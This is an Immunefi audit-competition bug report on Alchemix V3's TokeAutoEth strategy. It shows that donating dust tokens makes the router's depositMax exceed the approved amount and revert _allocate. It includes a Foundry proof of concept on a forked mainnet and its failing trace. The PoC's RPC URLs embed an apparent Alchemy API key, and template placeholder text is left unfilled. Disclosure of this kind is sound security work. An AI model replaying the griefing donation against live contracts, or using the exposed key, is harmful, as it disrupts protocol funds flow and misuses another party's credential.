# 57096 sc medium the implementation of tokeautoeth allocate is incorrect

**Submitted on Oct 23rd 2025 at 13:04:20 UTC by @ox9527 for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57096
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/strategies/mainnet/TokeAutoEth.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

The \_allocate function in the TokeAutoEth contract approves WETH/USDC to the router based on the input amount.

However, the router’s depositMax function deposits the entire token balance held by the TokeAutoEth contract.

As a result, anyone can donate a small ("dust") amount of assets to the contract, causing the actual deposited amount to exceed the approved amount. This mismatch can cause the \_allocate function to fail completely.

## Vulnerability Details

TokeAutoEth.sol::\_allocate()

```solidity
    function _allocate(uint256 amount) internal override returns (uint256) {
        require(TokenUtils.safeBalanceOf(address(weth), address(this)) >= amount, "Strategy balance is less than amount");
        TokenUtils.safeApprove(address(weth), address(router), amount);
        uint256 shares = router.depositMax(autoEth, address(this), 0); <@
        TokenUtils.safeApprove(address(autoEth), address(rewarder), shares);
        rewarder.stake(address(this), shares);
        return amount;
    }
```

router::depositMax() <https://vscode.blockscan.com/ethereum/0x39ff6d21204B919441d17bef61D19181870835A2>

```solidity
    function depositMax(
        IAutopool vault,
        address to,
        uint256 minSharesOut
    ) public payable override returns (uint256 sharesOut) {
        IERC20 asset = IERC20(vault.asset());
        uint256 assetBalance = asset.balanceOf(msg.sender);
        uint256 maxDeposit = vault.maxDeposit(to);
        uint256 amount = maxDeposit < assetBalance ? maxDeposit : assetBalance;

        pullToken(asset, amount, address(this));

        approve(IERC20(vault.asset()), address(vault), amount);
        return deposit(vault, to, amount, minSharesOut);
    }
```

## Impact Details

Provide a detailed breakdown of possible losses from an exploit, especially if there are funds at risk. This illustrates the severity of the vulnerability, but it also provides the best possible case for you to be paid the correct amount. Make sure the selected impact is within the program’s list of in-scope impacts and matches the impact you selected.

## References

Add any relevant links to documentation or code

## Proof of Concept

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import "forge-std/console2.sol";
import {IMainRewarder, IAutopilotRouter} from "../strategies/interfaces/ITokemac.sol";
import {IERC4626} from "../../lib/openzeppelin-contracts/contracts/interfaces/IERC4626.sol";
interface IERC4626Like is IERC4626 {
    function balanceOfActual(address account) external view returns (uint256);
}
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address,uint256) external returns(bool);
}

interface IAavePool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
}

interface IAaveAToken {
    function balanceOf(address) external view returns (uint256);
}


interface IStargatePool {
    function deposit(address receiver, uint256 amountLD) external payable returns (uint256 amountLDOut);
    function redeem(uint256 lpAmount, address receiver) external returns (uint256 amountLDOut);
    function redeemable(address owner) external view returns (uint256 amountLD); // underlying denom
    function lpToken() external view returns (address);
    function tvl() external view returns (uint256);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IERC20Minimal {
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IAutoETH {
    function maxDeposit(address) external returns (uint256);
    function shutdown(uint8) external;
    function grantRole(bytes32 role,address account) external;
    function claimAutopoolRewards(address, address, address) external;
}

interface IMoonwell {
    function mint(uint) external returns (uint);
    function redeemUnderlying(uint redeemAmount) external returns (uint);
    function exchangeRateStored() external returns (uint);
    function exchangeRateCurrent() external returns (uint);
}

contract OnchainTest is Test {
    function setUp() public {
        //fork arbitrum aave usdc.
        //ARBITRUM_MAINNET_RPC_URL = "https://arb-mainnet.g.alchemy.com/v2/ep9fbX4C-PZXTbM_E9NsfLMT9SVD9Ivb";
        //start block = 390774695
        //end block = 390794695
        // vm.createSelectFork("https://opt-mainnet.g.alchemy.com/v2/ep9fbX4C-PZXTbM_E9NsfLMT9SVD9Ivb", 130116093);
        // vm.createSelectFork("https://arb-mainnet.g.alchemy.com/v2/ep9fbX4C-PZXTbM_E9NsfLMT9SVD9Ivb", 390794695);
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/ep9fbX4C-PZXTbM_E9NsfLMT9SVD9Ivb", 23503304);
    }


    receive() external payable {}

    function test_POC_122() public {
        address router = 0x39ff6d21204B919441d17bef61D19181870835A2;
        address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        address MYTStrategy = address(0x1001);
        address alice = address(0x1002);
        address autoUSD = 0xa7569A44f348d3D70d8ad5889e50F78E33d80D35;
        address rewarder = 0x726104CfBd7ece2d1f5b3654a19109A9e2b6c27B;

        //transfer 100e6 USDC to alice.
        deal(usdc,MYTStrategy, 100e6);
        deal(usdc,alice, 100e6);

        vm.prank(alice);
        IERC20(usdc).transfer(MYTStrategy,1e6);

        uint256 allocateAmount = 100e6;

        // Mock TokeAutoEth.sol::_allocate() start
        vm.startPrank(MYTStrategy);
        IERC20(usdc).approve(router, allocateAmount);
        IAutopilotRouter(router).depositMax(IERC4626Like(autoUSD), address(MYTStrategy), 0);

    }
```

Out:

```shell
    │   │   │   └─ ← [Return] 5404466222998572688175 [5.404e21]
    │   │   └─ ← [Return] 5404466222998572688175 [5.404e21]
    │   ├─ [4384] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transferFrom(0x0000000000000000000000000000000000001001, 0x39ff6d21204B919441d17bef61D19181870835A2, 101000000 [1.01e8])
    │   │   ├─ [3573] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0x0000000000000000000000000000000000001001, 0x39ff6d21204B919441d17bef61D19181870835A2, 101000000 [1.01e8]) [delegatecall]
    │   │   │   └─ ← [Revert] revert: ERC20: transfer amount exceeds allowance
    │   │   └─ ← [Revert] revert: ERC20: transfer amount exceeds allowance
    │   └─ ← [Revert] revert: ERC20: transfer amount exceeds allowance
    └─ ← [Revert] revert: ERC20: transfer amount exceeds allowance

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.22s (505.69ms CPU time)

Ran 1 test suite in 1.83s (1.22s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in src/test/Onchain.t.sol:OnchainTest
[FAIL: revert: ERC20: transfer amount exceeds allowance] test_POC_122() (gas: 698744)

Encountered a total of 1 failing tests, 0 tests succeeded
```
